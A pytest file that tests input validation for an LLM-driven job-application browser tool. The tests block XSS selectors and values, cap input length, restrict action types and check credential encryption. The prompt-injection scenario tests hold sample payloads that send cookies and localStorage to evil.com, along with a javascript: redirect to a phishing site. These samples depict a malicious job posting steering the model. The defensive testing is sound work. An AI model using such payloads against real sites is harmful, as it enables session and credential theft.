"""Security validation tests for prompt injection and XSS prevention.

Tests cover:
- Selector validation (blocks JavaScript protocols, script tags)
- Value validation (blocks XSS payloads, caps length)
- Action type validation (only allowed actions)
- Credential encryption (at rest in SQLite)
"""

import pytest
from pydantic import ValidationError

from jobcli.core.schemas import ActionType, BrowserAction, SelectorType
from jobcli.core.secure_config import EncryptionManager
from jobcli.storage.models import Database
from jobcli.storage.repositories import ConfigRepository


class TestSelectorValidation:
    """Test selector validation blocks malicious patterns."""

    def test_javascript_protocol_blocked(self):
        """Selectors with javascript: should be rejected."""
        with pytest.raises(ValidationError, match="javascript:"):
            BrowserAction(
                action=ActionType.CLICK,
                selector="javascript:alert('XSS')",
                selector_type=SelectorType.CSS,
            )

    def test_script_tag_blocked(self):
        """Selectors containing <script> should be rejected."""
        with pytest.raises(ValidationError, match="<script"):
            BrowserAction(
                action=ActionType.FILL,
                selector='input#email"><script>alert(1)</script>',
                value="test@example.com",
            )

    def test_data_uri_blocked(self):
        """data:text/html URIs should be rejected."""
        with pytest.raises(ValidationError, match="data:text/html"):
            BrowserAction(
                action=ActionType.CLICK,
                selector="data:text/html,<script>alert(1)</script>",
            )

    def test_event_handler_blocked(self):
        """Selectors with event handlers should be rejected."""
        dangerous_handlers = ["onload=", "onerror=", "onclick="]

        for handler in dangerous_handlers:
            with pytest.raises(ValidationError, match=handler):
                BrowserAction(
                    action=ActionType.CLICK,
                    selector=f'img {handler}alert(1)',
                )

    def test_eval_blocked(self):
        """Selectors with eval( should be rejected."""
        with pytest.raises(ValidationError, match="eval"):
            BrowserAction(
                action=ActionType.FILL,
                selector="input[name=eval(atob('YWxlcnQ='))]",
                value="test",
            )

    def test_safe_selector_passes(self):
        """Normal CSS selectors should pass validation."""
        # Should not raise
        action = BrowserAction(
            action=ActionType.FILL,
            selector="input#email",
            value="jane@example.com",
        )
        assert action.selector == "input#email"

    def test_safe_aria_selector_passes(self):
        """ARIA selectors should pass validation."""
        action = BrowserAction(
            action=ActionType.CLICK,
            selector="First Name",
            selector_type=SelectorType.TEXT,
        )
        assert action.selector == "First Name"


class TestValueValidation:
    """Test value validation blocks XSS and DoS."""

    def test_script_tag_in_value_blocked(self):
        """Values containing <script> should be rejected."""
        with pytest.raises(ValidationError, match="<script"):
            BrowserAction(
                action=ActionType.FILL,
                selector="input#name",
                value='John<script>alert(1)</script>',
            )

    def test_javascript_protocol_in_value_blocked(self):
        """Values with javascript: should be rejected."""
        with pytest.raises(ValidationError, match="javascript:"):
            BrowserAction(
                action=ActionType.FILL,
                selector="input#website",
                value="javascript:alert(document.cookie)",
            )

    def test_event_handler_in_value_blocked(self):
        """Values with event handlers should be rejected."""
        with pytest.raises(ValidationError, match="onerror="):
            BrowserAction(
                action=ActionType.FILL,
                selector="input#profile",
                value='<img src=x onerror=alert(1)>',
            )

    def test_oversized_value_blocked(self):
        """Values exceeding 10KB should be rejected (DoS prevention)."""
        huge_value = "A" * 10_001  # Just over 10KB

        with pytest.raises(ValidationError, match="exceeds maximum length"):
            BrowserAction(
                action=ActionType.FILL,
                selector="textarea#description",
                value=huge_value,
            )

    def test_normal_value_passes(self):
        """Normal values should pass validation."""
        action = BrowserAction(
            action=ActionType.FILL,
            selector="input#name",
            value="Jane Doe",
        )
        assert action.value == "Jane Doe"

    def test_long_but_safe_value_passes(self):
        """Values under 10KB should pass."""
        long_value = "A" * 9_999  # Just under 10KB

        action = BrowserAction(
            action=ActionType.FILL,
            selector="textarea#essay",
            value=long_value,
        )
        assert len(action.value) == 9_999

    def test_empty_value_passes(self):
        """Empty/None values should pass (no validation needed)."""
        action = BrowserAction(
            action=ActionType.CLICK,
            selector="button#submit",
            value=None,
        )
        assert action.value is None


class TestActionTypeValidation:
    """Test only allowed action types are accepted."""

    def test_valid_action_types_pass(self):
        """All ActionType enum values should be valid."""
        valid_actions = [
            ActionType.CLICK,
            ActionType.FILL,
            ActionType.TYPE,
            ActionType.SELECT,
            ActionType.UPLOAD,
            ActionType.SCROLL,
            ActionType.WAIT,
            ActionType.NAVIGATE,
            ActionType.ASK,
        ]

        for action_type in valid_actions:
            # Should not raise
            action = BrowserAction(
                action=action_type,
                selector="test_selector",
            )
            assert action.action == action_type

    def test_invalid_action_type_rejected(self):
        """Invalid action strings should be rejected by Pydantic."""
        with pytest.raises(ValidationError):
            BrowserAction(
                action="DELETE_COOKIES",  # type: ignore
                selector="test",
            )


class TestCredentialEncryption:
    """Test credentials are encrypted at rest."""

    @pytest.fixture
    def db(self):
        """Create in-memory test database."""
        database = Database("sqlite:///:memory:")
        database.create_tables()
        yield database
        database.drop_tables()

    @pytest.fixture
    def session(self, db):
        """Get database session."""
        sess = db.get_session()
        yield sess
        sess.close()

    def test_encryption_manager_creates_key(self, tmp_path):
        """EncryptionManager should create key file on init."""
        key_path = tmp_path / "secret.key"
        manager = EncryptionManager(key_path=key_path)

        assert key_path.exists(), "Key file not created"
        assert key_path.stat().st_mode & 0o777 == 0o600, "Key file has wrong permissions"

    def test_encryption_roundtrip(self, tmp_path):
        """Encrypt/decrypt should be reversible."""
        key_path = tmp_path / "secret.key"
        manager = EncryptionManager(key_path=key_path)

        plaintext = "sk-proj-secretApiKey123"
        encrypted = manager.encrypt(plaintext)

        assert encrypted != plaintext, "Encryption didn't transform data"

        decrypted = manager.decrypt(encrypted)
        assert decrypted == plaintext, "Decryption failed"

    def test_sensitive_keys_auto_encrypted(self, session, tmp_path):
        """API keys and passwords should be auto-encrypted in DB."""
        key_path = tmp_path / "secret.key"
        manager = EncryptionManager(key_path=key_path)
        repo = ConfigRepository(session, encryption_manager=manager)

        # Save sensitive key
        api_key = "sk-proj-abc123"
        repo.set("openai_api_key", api_key)

        # Check it's encrypted in DB
        from jobcli.storage.models import ConfigModel
        raw_record = session.query(ConfigModel).filter(
            ConfigModel.key == "openai_api_key"
        ).first()

        assert raw_record is not None
        assert raw_record.encrypted is True, "API key not marked as encrypted"
        assert raw_record.value != api_key, "API key stored as plaintext!"

        # Check it decrypts correctly on read
        retrieved = repo.get("openai_api_key")
        assert retrieved == api_key, "Decryption failed"

    def test_non_sensitive_keys_not_encrypted(self, session, tmp_path):
        """Non-sensitive config should not be encrypted."""
        key_path = tmp_path / "secret.key"
        manager = EncryptionManager(key_path=key_path)
        repo = ConfigRepository(session, encryption_manager=manager)

        # Save non-sensitive setting
        repo.set("headless", "true")

        # Check it's NOT encrypted
        from jobcli.storage.models import ConfigModel
        raw_record = session.query(ConfigModel).filter(
            ConfigModel.key == "headless"
        ).first()

        assert raw_record is not None
        assert raw_record.encrypted is False
        assert raw_record.value == "true"  # Plaintext

    def test_all_sensitive_keys_encrypted(self, session, tmp_path):
        """All keys in _SENSITIVE_KEYS should be auto-encrypted."""
        key_path = tmp_path / "secret.key"
        manager = EncryptionManager(key_path=key_path)
        repo = ConfigRepository(session, encryption_manager=manager)

        sensitive_keys = [
            ("openai_api_key", "sk-abc123"),
            ("anthropic_api_key", "sk-ant-xyz"),
            ("gemini_api_key", "AIza-123"),
            ("job_board_username", "user@example.com"),
            ("job_board_password", "P@ssw0rd!"),
            ("linkedin_username", "linkedin_user"),
            ("linkedin_password", "linkedin_pass"),
        ]

        for key, value in sensitive_keys:
            repo.set(key, value)

            # Verify encrypted in DB
            from jobcli.storage.models import ConfigModel
            raw_record = session.query(ConfigModel).filter(
                ConfigModel.key == key
            ).first()

            assert raw_record is not None
            assert raw_record.encrypted is True, f"{key} not encrypted"
            assert raw_record.value != value, f"{key} stored as plaintext"

            # Verify decrypts correctly
            retrieved = repo.get(key)
            assert retrieved == value, f"{key} decryption failed"

    def test_decryption_failure_returns_none(self, session, tmp_path):
        """Corrupted encrypted values should return None (fail-safe)."""
        key_path = tmp_path / "secret.key"
        manager = EncryptionManager(key_path=key_path)
        repo = ConfigRepository(session, encryption_manager=manager)

        # Manually insert corrupted encrypted value
        from jobcli.storage.models import ConfigModel
        corrupted = ConfigModel(
            key="corrupted_key",
            value="gAAAAABcorruptedData==",  # Invalid Fernet token
            encrypted=True,
        )
        session.add(corrupted)
        session.commit()

        # Should return None instead of crashing
        result = repo.get("corrupted_key")
        assert result is None, "Should return None for corrupted encrypted data"


class TestPromptInjectionScenarios:
    """Test real-world prompt injection attack scenarios."""

    def test_adversarial_job_posting_xss(self):
        """Malicious job posting trying to inject script via field labels."""
        # Attacker job posting has malicious field label
        malicious_selector = 'input[aria-label="Email<script>fetch(\'https://evil.com/steal?data=\'+document.cookie)</script>"]'

        with pytest.raises(ValidationError, match="<script"):
            BrowserAction(
                action=ActionType.FILL,
                selector=malicious_selector,
                value="victim@example.com",
            )

    def test_llm_compromised_navigation_attack(self):
        """LLM tries to navigate to phishing site."""
        with pytest.raises(ValidationError, match="javascript:"):
            BrowserAction(
                action=ActionType.NAVIGATE,
                selector="javascript:window.location='https://phishing.com/steal-creds'",
            )

    def test_dos_via_massive_description(self):
        """Attacker tries DoS by making LLM emit huge values."""
        dos_payload = "X" * 20_000  # 20KB

        with pytest.raises(ValidationError, match="exceeds maximum length"):
            BrowserAction(
                action=ActionType.FILL,
                selector="textarea#cover_letter",
                value=dos_payload,
            )

    def test_credential_theft_via_data_uri(self):
        """Attacker tries to exfiltrate data via data: URI."""
        with pytest.raises(ValidationError, match="data:text/html"):
            BrowserAction(
                action=ActionType.CLICK,
                selector="data:text/html,<script>fetch('https://evil.com?'+btoa(localStorage))</script>",
            )


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
